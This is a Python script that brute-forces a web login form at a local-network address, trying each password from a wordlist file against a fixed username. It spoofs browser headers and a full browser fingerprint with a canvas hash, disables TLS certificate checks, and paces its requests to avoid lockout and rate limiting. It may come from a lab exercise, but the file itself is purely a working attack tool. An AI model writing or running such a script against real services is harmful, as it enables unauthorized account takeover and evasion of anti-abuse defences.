import requests
import json
import time
import urllib3

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# === CONFIGURATION ===
url = "https://192.168.0.107:5000/login"
username = ""
password_file = "passwords.txt"  # one password per line

# Optional: use proxy for HTTPS bypass or debugging
# proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
proxies = {}

headers = {
    "Host": "192.168.0.107:5000",
    "Sec-Ch-Ua-Platform": "\"Windows\"",
    "Accept-Language": "en-US,en;q=0.9",
    "Sec-Ch-Ua": "\"Chromium\";v=\"135\", \"Not-A.Brand\";v=\"8\"",
    "Content-Type": "application/json",
    "Sec-Ch-Ua-Mobile": "?0",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
    "Accept": "*/*",
    "Origin": "https://192.168.0.107:5000",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://192.168.0.107:5000/",
    "Accept-Encoding": "gzip, deflate, br",
    "Priority": "u=1, i",
    "Connection": "keep-alive"
}

# Use a static or randomized fingerprint
fingerprint = {
    "browser": headers["User-Agent"],
    "os": "Win32",
    "screenResolution": "1920x1080",
    "timezone": "Europe/London",
    "language": "en-US",
    "colorDepth": 24,
    "pixelRatio": 1,
    "cookiesEnabled": True,
    "doNotTrack": None,
    "plugins": [
        {"name": "Chromium PDF Plugin", "description": "Portable Document Format"},
        {"name": "Chromium PDF Viewer", "description": ""}
    ],
    "cpuCores": 16,
    "connectionType": "4g",
    "timestamp": time.strftime("%a %b %d %Y %H:%M:%S GMT+0100 (British Summer Time)"),
    "canvasHash": "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMgAAAAyCAYAAAAZUZThAAAEFUlEQVR4AeyZva8NQRjGRyv+AYlo/Q"
}

def attempt_login(password):
    payload = {
        "username": username,
        "password": password,
        "fingerprint": json.dumps(fingerprint)
    }

    retries = 3  # Number of retries for transient errors
    for attempt in range(retries):
        try:
            response = requests.post(url, headers=headers, json=payload, proxies=proxies, verify=False, timeout=10)
            # Adjust this depending on actual response for failed/success login
            if response.status_code == 200 and "invalid" not in response.text.lower():
                print(f"[+] SUCCESS: Password found - {password}")
                return True
            else:
                print(f"[-] Failed attempt: {password}")
                return False
        except requests.exceptions.ConnectionError as e:
            print(f"[!] Connection error on attempt {attempt + 1}/{retries}: {e}")
        except requests.RequestException as e:
            print(f"[!] Request failed on attempt {attempt + 1}/{retries}: {e}")
        time.sleep(1)  # Wait before retrying
    return False

def main():
    with open(password_file, "r") as file:
        for line in file:
            password = line.strip()
            if attempt_login(password):
                break
            time.sleep(0.5)  # prevent lockout/rate limiting

if __name__ == "__main__":
    main()